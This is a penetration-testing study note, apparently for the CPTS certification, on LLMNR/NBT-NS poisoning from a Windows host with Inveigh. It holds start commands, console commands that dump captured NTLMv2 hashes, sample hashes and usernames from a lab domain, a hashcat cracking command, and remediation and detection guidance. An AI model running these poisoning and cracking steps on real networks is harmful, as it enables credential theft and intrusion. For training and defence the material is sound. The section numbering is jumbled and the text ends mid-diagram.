# 🪟 1. LLMNR/NBT-NS Poisoning from Windows

> [!info]  
> **Objective:** Perform LLMNR/NBT-NS poisoning from a **Windows attack host** using [Inveigh](https://github.com/Kevin-Robertson/InveighZero), capture NTLM authentication material, understand Inveigh's PowerShell and C# implementations, inspect captured users/hashes, and understand the corresponding remediation and detection techniques.

---

## 🧾 2. Command Cheat Sheet

### 🐚 PowerShell Inveigh

```powershell
Import-Module .\Inveigh.ps1
```

Load the PowerShell Inveigh module.

```powershell
(Get-Command Invoke-Inveigh).Parameters
```

Enumerate the available parameters for `Invoke-Inveigh`.

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Start Inveigh with:

- LLMNR spoofing enabled
    
- NBNS spoofing enabled
    
- Console output enabled
    
- File output enabled
    

```powershell
Stop-Inveigh
```

Stop the PowerShell Inveigh instance.

---

### ⚙️ C# Inveigh / InveighZero

```powershell
.\Inveigh.exe
```

Start the compiled C# version using its defaults.

> [!tip]  
> The C# implementation is the actively maintained version of Inveigh. The original PowerShell implementation is no longer updated.

---

### 🎛️ Inveigh Interactive Console

Press:

```text
ESC
```

Enter/exit the interactive console.

```text
HELP
```

Display available console commands.

```text
GET NTLMV1
GET NTLMV2
```

Display captured NTLMv1/NTLMv2 hashes.

```text
GET NTLMV1UNIQUE
GET NTLMV2UNIQUE
```

Display one captured hash per unique user.

```text
GET NTLMV1USERNAMES
GET NTLMV2USERNAMES
```

Display usernames and source information associated with captured hashes.

```text
GET CLEARTEXT
GET CLEARTEXTUNIQUE
```

Display captured cleartext credentials.

```text
GET LOG
```

Display log entries.

```text
GET CONSOLE
```

Display queued console output.

```text
SET CONSOLE
```

Change the console-output setting.

```text
HISTORY
```

Display command history.

```text
RESUME
```

Resume real-time console output.

```text
STOP
```

Stop Inveigh.

---

### 🛡️ NBT-NS Remediation

PowerShell script used to disable NetBIOS over TCP/IP:

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

---

## 🧠 3. What Is LLMNR/NBT-NS Poisoning?

**LLMNR** and **NBT-NS** are legacy/local name-resolution mechanisms used when normal DNS resolution does not provide an answer.

The important security problem is:

```text
Victim wants to resolve a hostname
             │
             ▼
       DNS resolution
             │
       ❌ No answer
             │
             ▼
       LLMNR / NBT-NS
             │
             ▼
     Broadcast/query request
             │
       ┌─────┴─────┐
       │           │
    Legit host   Attacker
                  │
                  ▼
            "That's me!"
                  │
                  ▼
        Victim authenticates
             using NTLM
                  │
                  ▼
        Attacker captures
        NTLM challenge/
        response material
```

> [!important]  
> The attacker is exploiting **fallback name resolution**. The victim asks the local network, effectively, "Who is this host?" If the attacker responds first and claims to own that name, the victim may attempt authentication to the attacker's machine.

This is why LLMNR/NBT-NS poisoning is valuable during an internal penetration test.

---

# 🪤 4. Why Inveigh?

[Inveigh](https://github.com/Kevin-Robertson/InveighZero) serves a similar role to [Responder](https://github.com/lgandx/Responder), but is designed to operate from a **Windows host**.

This becomes particularly useful when:

- The attack box is Windows.
    
- A client provides a Windows attack workstation.
    
- You have compromised a Windows host.
    
- You have local administrator access to a Windows system.
    
- You want to continue enumerating and expanding access from the compromised Windows host.
    

Inveigh is a .NET/PowerShell machine-in-the-middle tool capable of handling IPv4/IPv6 and multiple protocols.

### 🌐 Protocols Relevant to Inveigh

The source describes support for:

- LLMNR
    
- DNS
    
- mDNS
    
- NBNS
    
- DHCPv6
    
- ICMPv6
    
- HTTP
    
- HTTPS
    
- SMB
    
- LDAP
    
- WebDAV
    
- Proxy Authentication
    

This makes Inveigh more than simply an LLMNR/NBNS poisoner.

---

# 🧠 5. Mental Model — Windows Host as the Poisoner

The key CPTS mental model is:

```text
             🪟 WINDOWS ATTACK HOST
                       │
                       ▼
                 🛠️ INVEIGH
                       │
        ┌──────────────┼──────────────┐
        ▼              ▼              ▼
      LLMNR           NBNS           Other
        │              │           protocols
        ▼              ▼              ▼
    Victim sends local name-resolution request
                       │
                       ▼
                 Inveigh responds
                       │
                       ▼
             Victim connects to attacker
                       │
                       ▼
             NTLM authentication
                       │
                       ▼
          Challenge/response captured
                       │
              ┌────────┴────────┐
              ▼                 ▼
        Offline cracking    Relay/other
        when appropriate     follow-up
```

> [!important]  
> The captured material is generally **NTLM challenge-response material**, not simply a plaintext password.

---

# 🔎 6. PowerShell Inveigh

## 6.1 Load the Module

```powershell
Import-Module .\Inveigh.ps1
```

This imports the PowerShell implementation into the current PowerShell session.

---

## 6.2 Enumerate Available Parameters

```powershell
(Get-Command Invoke-Inveigh).Parameters
```

This is useful because Inveigh has a large number of configurable behaviors.

Example output:

```text
Key                     Value
---                     -----
ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
KerberosHostHeader      System.Management.Automation.ParameterMetadata
ProxyIgnore             System.Management.Automation.ParameterMetadata
PcapTCP                 System.Management.Automation.ParameterMetadata
PcapUDP                 System.Management.Automation.ParameterMetadata
SpooferHostsReply       System.Management.Automation.ParameterMetadata
SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
SpooferIPsReply         System.Management.Automation.ParameterMetadata
SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
WPADDirectHosts         System.Management.Automation.ParameterMetadata
WPADAuthIgnore          System.Management.Automation.ParameterMetadata
ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
ConsoleStatus           System.Management.Automation.ParameterMetadata
ADIDNSThreshold         System.Management.Automation.ParameterMetadata
ADIDNSTTL               System.Management.Automation.ParameterMetadata
DNSTTL                  System.Management.Automation.ParameterMetadata
HTTPPort                System.Management.Automation.ParameterMetadata
HTTPSPort               System.Management.Automation.ParameterMetadata
KerberosCount           System.Management.Automation.ParameterMetadata
LLMNRTTL                System.Management.Automation.ParameterMetadata

<SNIP>
```

> [!tip]  
> Rather than memorizing every parameter, understand the **categories of behavior**:
> 
> - What protocols are being spoofed?
>     
> - Where are responses sent?
>     
> - What authentication mechanisms are captured?
>     
> - Where is output stored?
>     
> - What hosts/domains/IPs are ignored?
>     
> - What listeners are enabled?
>     

---

# 🎯 7. Starting PowerShell Inveigh

The source starts Inveigh with:

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

This enables the relevant spoofing/output features while leaving the remaining settings at their defaults.

### 🧩 Important Options

|Option|Purpose|
|---|---|
|`Y`|Enables the corresponding Inveigh setting|
|`-NBNS Y`|Enables NBNS spoofing|
|`-ConsoleOutput Y`|Displays output in the console|
|`-FileOutput Y`|Writes output to files|

---

## 7.1 Startup Output

```text
[*] Inveigh 1.506 started at 2022-02-28T19:26:30
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Certificate Issuer = Inveigh
[+] HTTPS Certificate CN = localhost
[+] HTTPS Capture = Enabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
```

### 🔎 Reading the Startup Configuration

The output tells us exactly what Inveigh has enabled.

For example:

```text
[+] LLMNR Spoofer = Enabled
[+] NBNS Spoofer For Types 00,20 = Enabled
```

means the two important name-resolution poisoning mechanisms are active.

```text
[+] SMB Capture = Enabled
```

means Inveigh is prepared to capture SMB authentication traffic.

```text
[+] HTTP/HTTPS Authentication = NTLM
```

indicates NTLM authentication is being used for the relevant listeners.

```text
[+] File Output = Enabled
[+] Output Directory = C:\Tools
```

means captured information is also written to files under `C:\Tools`.

---

# ⚠️ 8. Understanding the HTTP Listener Error

The source shows:

```text
WARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listener
WARNING: [!] [2022-02-28T19:26:31] Exception calling "Start" with "0" argument(s): "An attempt was made to access a
socket in a way forbidden by its access permissions" $HTTP_listener.Start()
```

This does **not** necessarily mean that the entire Inveigh operation failed.

The subsequent output demonstrates that LLMNR poisoning is still functioning:

```text
[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
```

> [!important]  
> Always distinguish between **one listener failing** and **the entire tool failing**.
> 
> Here, the HTTP listener encountered a socket/port problem, but LLMNR spoofing continued successfully.

---

# 📡 9. Recognizing a Successful LLMNR Poisoning Event

Inveigh reports:

```text
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
```

The important line is:

```text
LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
```

### 🧠 Interpretation

```text
172.16.5.125
      │
      │ "Where is academy-ea-web0?"
      │
      ▼
   LLMNR request
      │
      ▼
   Inveigh
      │
      │ "I am academy-ea-web0"
      ▼
  Response sent
      │
      ▼
Victim may connect/authenticate
```

The source then shows SMB traffic:

```text
[+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834
```

This is the important progression:

```text
LLMNR query
    ↓
Spoofed response
    ↓
Victim connects to attacker
    ↓
SMB negotiation
    ↓
NTLM authentication
    ↓
Challenge/response material captured
```

---

# 🧬 10. C# Inveigh / InveighZero

The original PowerShell version is no longer maintained.

The C# implementation combines the original proof-of-concept C# code with a C# port of much of the PowerShell functionality.

The maintained project is [InveighZero](https://github.com/Kevin-Robertson/InveighZero).

The lab provides a compiled executable, but the source emphasizes that learning to compile the tool yourself is useful practice.

---

# ⚙️ 11. Starting the C# Version

```powershell
.\Inveigh.exe
```

Example startup output:

```text
[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
```

---

# 🔍 12. Understanding the `[+]` and `[ ]` Indicators

The startup output provides a quick configuration map.

```text
[+] = enabled
[ ] = disabled
```

For example:

```text
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] SMB Packet Sniffer [Port 445]
```

means:

- LLMNR monitoring is enabled.
    
- mDNS is disabled.
    
- NBNS is disabled in this default C# configuration.
    
- SMB packet sniffing is enabled.
    

The runtime output also explicitly tells us when a request is ignored because its functionality is disabled.

Example:

```text
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
```

This means the request was observed, but that particular record type was not handled.

---

# 🌐 13. IPv4 vs IPv6 in the Output

The C# version can listen and spoof across IPv4 and IPv6.

Example:

```text
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
```

And later:

```text
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
```

### 🧠 Mental Model

```text
                    INVEIGH
                       │
             ┌─────────┴─────────┐
             ▼                   ▼
          IPv4                  IPv6
             │                   │
      172.16.5.x             fe80::...
             │                   │
             └─────────┬─────────┘
                       ▼
                 LLMNR traffic
```

> [!important]  
> During enumeration, do not assume that seeing only IPv4 addresses means IPv6 is irrelevant. Inveigh can observe and respond to both address families.

---

# 🎛️ 14. The Interactive Console

While the C# version is running:

```text
Press ESC to enter/exit interactive console
```

Press:

```text
ESC
```

The console provides access to:

- Captured NTLMv1 hashes
    
- Captured NTLMv2 hashes
    
- Unique hashes
    
- Usernames
    
- Cleartext credentials when captured
    
- Logs
    
- Queued output
    
- Startup parameters
    
- History
    
- Stopping Inveigh
    
- Resuming real-time output
    

---

# 📋 15. Inveigh Console Commands

```text
=============================================== Inveigh Console Commands ===============================================

Command                           Description
========================================================================================================================
GET CONSOLE                     | get queued console output
GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
GET LOG                         | get log entries; add search string to filter results
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
GET CLEARTEXT                   | get captured cleartext credentials
GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
GET REPLYTODOMAINS              | get ReplyToDomains parameter startup values
GET REPLYTOHOSTS                | get ReplyToHosts parameter startup values
GET REPLYTOIPS                  | get ReplyToIPs parameter startup values
GET REPLYTOMACS                 | get ReplyToMACs parameter startup values
GET IGNOREDOMAINS               | get IgnoreDomains parameter startup values
GET IGNOREHOSTS                 | get IgnoreHosts parameter startup values
GET IGNOREIPS                   | get IgnoreIPs parameter startup values
GET IGNOREMACS                  | get IgnoreMACs parameter startup values
SET CONSOLE                     | set Console parameter value
HISTORY                         | get command history
RESUME                          | resume real time console output
STOP                            | stop Inveigh
```

> [!tip]  
> For CPTS, the most important commands to remember from this list are:
> 
> ```text
> GET NTLMV1
> GET NTLMV2
> GET NTLMV1UNIQUE
> GET NTLMV2UNIQUE
> GET NTLMV1USERNAMES
> GET NTLMV2USERNAMES
> GET LOG
> STOP
> ```
> 
> These let you quickly determine **what was captured, who generated it, and what you can investigate next**.

---

# 🔐 16. Viewing Unique NTLMv2 Hashes

Use:

```text
GET NTLMV2UNIQUE
```

Example:

```text
================================================= Unique NTLMv2 Hashes =================================================

Hashes
========================================================================================================================
backupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F6AF75C47C3B50CB5:01010000000000001DBF1816222DD801DF80FE7D54E898EF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001DBF1816222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:010100000000000016010623222DD801B9083B0DCEE1D9520000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D0041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080016010623222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000

<SNIP>
```

The important point is that the captured material identifies the account and domain while containing the NTLMv2 challenge/response data.

---

# 👤 17. Enumerating Captured Usernames

Use:

```text
GET NTLMV2USERNAMES
```

Example output:

```text
=================================================== NTLMv2 Usernames ===================================================

IP Address                        Host                              Username                          Challenge
========================================================================================================================
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\backupagent       | B5013246091943D7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\forend              | 32FD89BD78804B04
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\clusteragent      | 28BF08D82FA998E4
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\wley              | 277AC2ED022DB4F7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\svc_qualys        | 5F9BB670D23F23ED
```

### 🔎 What This Gives Us

From the output we can build a useful target list:

```text
backupagent
forend
clusteragent
wley
svc_qualys
```

We also learn:

```text
Domain: INLANEFREIGHT
Host:   ACADEMY-EA-FILE
Source: 172.16.5.125
```

This can become valuable for further enumeration.

---

# 🔓 23. Cracking Captured NetNTLMv2

Once hashes have been collected, attempt offline cracking.

The source uses:

```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

### Breakdown

```text
hashcat
    ↓
Password-cracking engine

-m 5600
    ↓
NetNTLMv2 mode

forend_ntlmv2
    ↓
File containing captured NetNTLMv2 material

/usr/share/wordlists/rockyou.txt
    ↓
Dictionary used for the attack
```
# 🔁 18. Why Username Enumeration Matters

The username list is useful even before attempting any password recovery.

Mental model:

```text
LLMNR/NBNS Poisoning
        ↓
Capture authentication
        ↓
Extract usernames
        ↓
Build account list
        ↓
Identify interesting accounts
        ↓
Evaluate authentication material
        ↓
Offline password recovery where appropriate
        ↓
Retest recovered credentials
        ↓
Expand access
```

For example, service-style accounts such as:

```text
svc_qualys
clusteragent
backupagent
```

may deserve additional investigation because their purpose can imply privileges, service access, or reuse elsewhere.

> [!warning]  
> A username being captured does **not** mean the account is privileged, valid everywhere, or crackable. Treat it as an enumeration result that feeds the next phase of the assessment.

---

# 🧠 19. CPTS Methodology — What the Author Is Actually Doing

The walkthrough is not simply:

> "Run Inveigh and get hashes."

The underlying methodology is:

```text
🪟 Gain Windows foothold
        ↓
🔎 Ask: What can I do from this host?
        ↓
📡 Observe local name-resolution traffic
        ↓
🪤 Identify LLMNR/NBNS poisoning opportunity
        ↓
🛠️ Deploy Inveigh
        ↓
📨 Wait for name-resolution requests
        ↓
🎭 Spoof the requested hostname
        ↓
🔐 Victim authenticates to attacker
        ↓
🧬 Capture NTLM material
        ↓
👤 Extract usernames
        ↓
🔓 Assess captured authentication material
        ↓
🔁 Retest discovered credentials elsewhere
```

### 🎯 The Key CPTS Insight

**A compromised Windows machine can become an attack platform.**

You do not necessarily need to return to Kali for every attack.

If you obtain a Windows foothold:

```text
Compromised Windows host
          │
          ├── Enumeration
          ├── Credential discovery
          ├── LLMNR/NBNS poisoning
          ├── Network discovery
          ├── Authentication capture
          └── Lateral movement opportunities
```

This is why Windows-based tooling is important for CPTS.

---

# 🛡️ 20. Remediation

MITRE ATT&CK identifies this activity under **T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay**.

The primary mitigation is to eliminate or restrict the protocols that allow the poisoning opportunity.

---

# 🚫 21. Disable LLMNR

LLMNR can be disabled through Group Policy.

Navigate to:

```text
Computer Configuration
    ↓
Administrative Templates
    ↓
Network
    ↓
DNS Client
    ↓
Turn OFF Multicast Name Resolution
```

Enable:

```text
Turn OFF Multicast Name Resolution
```

### 🧠 Why?

This prevents Windows from using LLMNR as a multicast name-resolution fallback.

---

# 🚫 22. Disable NBT-NS

NBT-NS cannot be directly disabled through a standard Group Policy setting in the same manner as LLMNR.

It can be disabled locally through the network adapter settings.

Path:

```text
Control Panel
    ↓
Network and Sharing Center
    ↓
Change adapter settings
    ↓
Right-click adapter
    ↓
Properties
    ↓
Internet Protocol Version 4 (TCP/IPv4)
    ↓
Properties
    ↓
Advanced
    ↓
WINS
    ↓
Disable NetBIOS over TCP/IP
```

---

# ⚙️ 23. Disabling NBT-NS with PowerShell

The source provides a PowerShell script that can be deployed through Group Policy:

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

### 🧠 What the Script Does

It accesses:

```text
HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces
```

and sets:

```text
NetbiosOptions = 2
```

for the relevant NetBT interfaces.

The objective is to disable NetBIOS over TCP/IP.

---

# 🏢 24. Deploying the NBT-NS Script Through Group Policy

The script can be configured under:

```text
Computer Configuration
    ↓
Windows Settings
    ↓
Scripts (Startup/Shutdown)
    ↓
Startup
    ↓
PowerShell Scripts
```

Configure:

```text
For this GPO, run scripts in the following order:
Run Windows PowerShell scripts first
```

Then:

```text
Add
    ↓
Select the PowerShell script
```

The changes require either:

- A system reboot, or
    
- Restarting the network adapter.
    

---

# 🌐 25. Deploying Across the Domain

For domain-wide deployment, the script can be hosted in the domain's SYSVOL share:

```text
\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

The GPO can then be applied to the appropriate OUs.

Mental model:

```text
Domain Controller
       │
       ▼
     GPO
       │
       ▼
   Startup script
       │
       ▼
     SYSVOL
       │
       ▼
 Domain computers / OUs
       │
       ▼
      Reboot
       │
       ▼
 NBT-NS disabled
```

> [!warning]  
> Disabling legacy name-resolution mechanisms can affect applications or systems that depend on them. A penetration tester should recommend the mitigation while clearly communicating that the client should test the change before broad deployment.

---

# 🛡️ 26. Additional Mitigations

Other defensive measures include:

### 🔥 Network Traffic Filtering

Filter traffic associated with:

- LLMNR
    
- NetBIOS
    

### ✍️ SMB Signing

Enable **SMB signing** to help prevent NTLM relay attacks.

### 🕵️ IDS/IPS

Network intrusion detection/prevention systems can identify suspicious spoofing and authentication activity.

### 🧱 Network Segmentation

Segment systems that genuinely require LLMNR or NetBIOS so that the protocols are not unnecessarily available across the broader network.

---

# 🔎 27. Detection

Disabling LLMNR and NetBIOS is not always immediately possible.

Therefore, defenders should also detect poisoning behavior.

---

## 🎯 27.1 Active Detection Using Fake Requests

One detection strategy is to intentionally generate LLMNR/NBT-NS requests for **non-existent hosts** across different network segments.

Normal hosts should have no legitimate reason to answer for these fake names.

If a system responds:

```text
Fake hostname request
        ↓
No legitimate host should answer
        ↓
Unexpected response
        ↓
🚨 Possible spoofing / poisoning host
```

This can reveal an attacker attempting to answer name-resolution requests.

---

## 📡 27.2 Monitor Relevant Network Ports

Monitor traffic involving:

```text
UDP 5355 → LLMNR
UDP 137  → NetBIOS Name Service
```

Unexpected or suspicious activity on these ports can indicate poisoning attempts.

---

# 🪪 28. Windows Event IDs

The source recommends monitoring:

```text
Event ID 4697
Event ID 7045
```

These can provide visibility into service installation/activity that may be relevant to suspicious activity.

> [!important]  
> Event IDs should be interpreted in context. An event by itself does not prove LLMNR/NBT-NS poisoning.

---

# 🗃️ 29. Registry Monitoring

Monitor:

```text
HKLM\Software\Policies\Microsoft\Windows NT\DNSClient
```

Specifically monitor changes to:

```text
EnableMulticast
```

A value of:

```text
0
```

indicates that LLMNR is disabled.

### 🧠 Defensive Mental Model

```text
Configuration monitoring
        ↓
Registry changes
        ↓
EnableMulticast
        ↓
0 = LLMNR disabled
```

---

# 📊 30. PowerShell Inveigh vs C# Inveigh

|Feature|PowerShell Inveigh|C# Inveigh / InveighZero|
|---|---|---|
|Implementation|PowerShell|C# / .NET|
|Status in source|Original / no longer updated|Maintained implementation|
|Windows focused|Yes|Yes|
|LLMNR|Supported|Supported|
|IPv4|Supported|Supported|
|IPv6|Supported|Supported|
|Interactive console|Available|Available|
|NTLM capture|Supported|Supported|
|File output|Supported|Supported|
|Useful when Windows is attack box|Yes|Yes|

> [!important]  
> The important CPTS distinction is not memorizing implementation details. It is recognizing that **Inveigh provides a Windows-native alternative to Responder for this class of internal credential-capture attack**.

---

# 🧠 31. Responder vs Inveigh — Mental Model

```text
                 LLMNR/NBNS Poisoning
                         │
              ┌──────────┴──────────┐
              ▼                     ▼
           Linux                   Windows
              │                     │
              ▼                     ▼
         Responder              Inveigh
              │                     │
              └──────────┬──────────┘
                         ▼
               Spoof name resolution
                         │
                         ▼
                Capture authentication
                         │
                         ▼
                Analyze credentials
```

The platform determines which tool is most convenient.

---

# 🧬 32. Full Attack-Chain Mental Model

```text
🪟 WINDOWS FOOTHOLD
       │
       ▼
🔎 ENUMERATE NETWORK
       │
       ▼
📡 OBSERVE NAME-RESOLUTION TRAFFIC
       │
       ▼
❓ Find LLMNR/NBNS activity
       │
       ▼
🛠️ START INVEIGH
       │
       ▼
🎭 SPOOF NAME-RESOLUTION RESPONSE
       │
       ▼
🖥️ VICTIM CONNECTS TO ATTACKER
       │
       ▼
🔐 NTLM AUTHENTICATION
       │
       ▼
🧬 CAPTURE NTLM CHALLENGE/RESPONSE
       │
       ▼
👤 ENUMERATE USERNAMES
       │
       ├───────────────┐
       ▼               ▼
🔓 Assess offline    🔁 Retest
   recovery           credentials
       │               │
       └───────┬───────┘
               ▼
        📈 Expand Access
```

---

# ⚠️ 33. Important CPTS Distinctions

### LLMNR/NBT-NS Poisoning ≠ Password Capture

What you normally obtain is authentication material such as:

```text
NTLMv2 challenge/response
```

not:

```text
plaintext password
```

---

### LLMNR ≠ DNS

LLMNR is a **local/multicast fallback mechanism**, while DNS is the normal hierarchical name-resolution system.

The attack abuses the fallback behavior.

---

### Captured Username ≠ Compromised Account

Seeing:

```text
INLANEFREIGHT\svc_qualys
```

does not prove that:

- The password is known.
    
- The account is privileged.
    
- The account is valid on another host.
    
- The account can be cracked.
    
- The account can authenticate through every service.
    

It is an **enumeration result**.

---

### One Listener Failing ≠ Inveigh Failing

For example:

```text
HTTP listener failed
```

while:

```text
LLMNR response sent
SMB negotiation detected
NTLM challenge observed
```

means the LLMNR/SMB portion is still functioning.

Always read the output **component by component**.

---

# 🧭 34. CPTS Decision Flow

```text
Do I have a Windows foothold?
          │
       ┌──┴──┐
       │     │
      NO    YES
       │     │
       │     ▼
       │  Can I observe
       │  local traffic?
       │     │
       │     ▼
       │  LLMNR/NBNS present?
       │     │
       │    YES
       │     │
       │     ▼
       │  Use Inveigh
       │     │
       │     ▼
       │  Capture NTLM material
       │     │
       │     ▼
       │  Enumerate usernames
       │     │
       │     ├──► Assess captured material
       │     │
       │     └──► Retest discovered identities
       │
       └──► Use appropriate Linux-side tooling
```

---

# 🛡️ 35. Defensive Mental Model

```text
                    LLMNR/NBT-NS
                         │
          ┌──────────────┴──────────────┐
          ▼                             ▼
       Prevent                       Detect
          │                             │
          ├── Disable LLMNR             ├── Monitor UDP 5355
          ├── Disable NBT-NS            ├── Monitor UDP 137
          ├── SMB Signing               ├── Monitor event activity
          ├── Traffic filtering         ├── Monitor registry changes
          └── Segmentation              └── Fake-name detection
```

---

# 🔗 36. Tool & Reference Links

- [Inveigh / InveighZero](https://github.com/Kevin-Robertson/InveighZero) — Windows/.NET IPv4/IPv6 machine-in-the-middle tooling.
    
- [PowerShell](https://github.com/PowerShell/PowerShell) — PowerShell project/source.
    
- [Hashcat](https://hashcat.net/hashcat/) — password recovery tool referenced for assessing captured authentication material.
    
- [MITRE ATT&CK](https://attack.mitre.org/) — ATT&CK reference for LLMNR/NBT-NS Poisoning and SMB Relay.
    

---

# 🧠 37. Key Takeaways

> [!success]  
> **CPTS Exam Mental Model**
> 
> 1. **LLMNR/NBT-NS poisoning abuses local name-resolution fallback.**
>     
> 2. A Windows foothold can become an **active attack platform**.
>     
> 3. **Inveigh** is the Windows-oriented counterpart to tools such as Responder.
>     
> 4. The PowerShell version and C# version expose similar attack concepts, while the C# implementation is the maintained version.
>     
> 5. `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` starts the PowerShell attack with NBNS spoofing and output enabled.
>     
> 6. `.\Inveigh.exe` starts the C# implementation with its default configuration.
>     
> 7. Press **`ESC`** to access the C# interactive console.
>     
> 8. `GET NTLMV2UNIQUE` retrieves unique captured NTLMv2 hashes.
>     
> 9. `GET NTLMV2USERNAMES` is useful for building a username enumeration list.
>     
> 10. Captured NTLM material can become a path toward **offline password recovery or other authentication attacks**, depending on the assessment scenario.
>     
> 11. A failed listener does not necessarily mean the entire tool failed—read each component of the output.
>     
> 12. Primary remediation is to **disable LLMNR and NBT-NS where operationally safe**, while also considering SMB signing, filtering, segmentation, and detection.
>     
> 13. Detection can include monitoring **UDP 5355**, **UDP 137**, relevant Windows events, registry changes, and active fake-name-resolution probes.
>     
> 14. The core attack chain is:
>     

```text
WINDOWS FOOTHOLD
      ↓
OBSERVE LLMNR/NBNS
      ↓
INVEIGH
      ↓
SPOOF RESPONSE
